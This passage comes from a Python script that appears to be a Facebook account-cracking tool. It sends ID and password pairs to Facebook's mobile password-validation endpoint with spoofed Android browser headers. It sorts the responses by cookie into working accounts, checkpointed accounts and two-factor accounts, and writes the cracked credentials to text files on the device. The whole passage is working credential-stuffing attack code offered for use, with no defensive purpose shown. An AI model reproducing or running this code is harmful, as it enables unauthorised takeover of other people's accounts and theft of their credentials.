            heade={'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fp.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = ses.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[1;93m[CRAZY-CP] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/CRAZY-CP.txt', 'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif twf in ses.cookies.get_dict().keys():
                print(f'{B}[CRAZY-2F] {idf}|{pw}')
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\x1b[1;92m[CRAZY-OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/CRAZY-OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop+=1


if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    login()

